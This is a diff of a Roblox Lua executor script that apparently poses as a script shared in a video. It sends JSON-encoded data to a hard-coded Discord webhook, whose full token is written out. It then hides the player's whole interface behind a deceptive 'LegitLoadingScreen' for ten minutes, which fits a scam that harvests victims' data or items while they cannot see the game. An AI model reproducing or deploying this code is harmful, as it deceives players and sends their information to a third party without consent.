@@ -28,88 +28,47 @@ if httpRequest then
     }
 
     httpRequest({
-        Url = "https://discord.com/api/webhooks/1387638771029119137/eHF-Fy4iN1ByMn3xb7zH_pOzIWhGVk_9x1RckYY1kHlq0Ybv5DexzUHkdh6AoOi-BNxN", -- 🔁 Replace this!
+        Url = "https://discord.com/api/webhooks/1387638771029119137/eHF-Fy4iN1ByMn3xb7zH_pOzIWhGVk_9x1RckYY1kHlq0Ybv5DexzUHkdh6AoOi-BNxN",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = game:GetService("HttpService"):JSONEncode(data)
     })
 end
 
--- ✅ GUI and Script Core
+-- ✅ GUI and Script Core (Optimized)
 local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- Disable CoreGui
+-- Disable default GUI
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
--- Safe cleanup
+-- Cleanup unwanted objects
 for _, v in ipairs(workspace:GetChildren()) do
 	if v:IsA("Tool") or v.Name:match("UnneededUI") then
 		v:Destroy()
 	end
 end
 
--- GUI Setup
+-- Minimal clean GUI
 local screenGui = Instance.new("ScreenGui", PlayerGui)
 screenGui.Name = "LegitLoadingScreen"
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.ResetOnSpawn = false
 
 local bg = Instance.new("Frame", screenGui)
-bg.Name = "Background"
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.new(0, 0, 0)
 
 local title = Instance.new("TextLabel", bg)
-title.Text = "Please wait while executing the script in the video <3"
+title.Text = "Executing script... Please wait for 10 minutes ⏳"
 title.Font = Enum.Font.FredokaOne
 title.TextScaled = true
 title.TextColor3 = Color3.fromRGB(200, 200, 200)
 title.BackgroundTransparency = 1
 title.Size = UDim2.new(0.8, 0, 0.1, 0)
-title.Position = UDim2.new(0.1, 0, 0.15, 0)
-
-local barBg = Instance.new("Frame", bg)
-barBg.Size = UDim2.new(0.6, 0, 0.05, 0)
-barBg.Position = UDim2.new(0.2, 0, 0.4, 0)
-barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-
-local bar = Instance.new("Frame", barBg)
-bar.Size = UDim2.new(0, 0, 1, 0)
-bar.BackgroundColor3 = Color3.fromRGB(120, 120, 255)
-
-local percent = Instance.new("TextLabel", bg)
-percent.Size = UDim2.new(0.2, 0, 0.05, 0)
-percent.Position = UDim2.new(0.4, 0, 0.48, 0)
-percent.Text = "0%"
-percent.Font = Enum.Font.FredokaOne
-percent.TextScaled = true
-percent.BackgroundTransparency = 1
-percent.TextColor3 = Color3.new(1, 1, 1)
-
-local assetText = Instance.new("TextLabel", bg)
-assetText.Size = UDim2.new(0.6, 0, 0.05, 0)
-assetText.Position = UDim2.new(0.2, 0, 0.56, 0)
-assetText.Text = "Loading Assets: 0/1000"
-assetText.Font = Enum.Font.FredokaOne
-assetText.TextScaled = true
-assetText.BackgroundTransparency = 1
-assetText.TextColor3 = Color3.new(1, 1, 1)
-
--- Animate loading bar
-local assetsLoaded = 0
-local goal = 1000
-
-for i = 1, goal do
-	assetsLoaded += 1
-	assetText.Text = "Loading Assets: " .. assetsLoaded .. "/" .. goal
-	percent.Text = math.floor((assetsLoaded / goal) * 100) .. "%"
-	bar:TweenSize(UDim2.new(assetsLoaded / goal, 0, 1, 0), "Out", "Linear", 0.03, true)
-	wait(0.005)
-end
+title.Position = UDim2.new(0.1, 0, 0.45, 0)
 
 -- Anti-noclip + Ground Fix
 local function enforceCharacterPhysics(character)
@@ -134,14 +93,13 @@ local function enforceCharacterPhysics(character)
 	end
 end
 
--- Apply physics fix to current and future characters
 if LocalPlayer.Character then
 	enforceCharacterPhysics(LocalPlayer.Character)
 end
 
 LocalPlayer.CharacterAdded:Connect(enforceCharacterPhysics)
 
--- Wait 10 minutes (600 seconds)
+-- Wait full 10 minutes
 task.wait(600)
 
 -- Restore GUI and cleanup
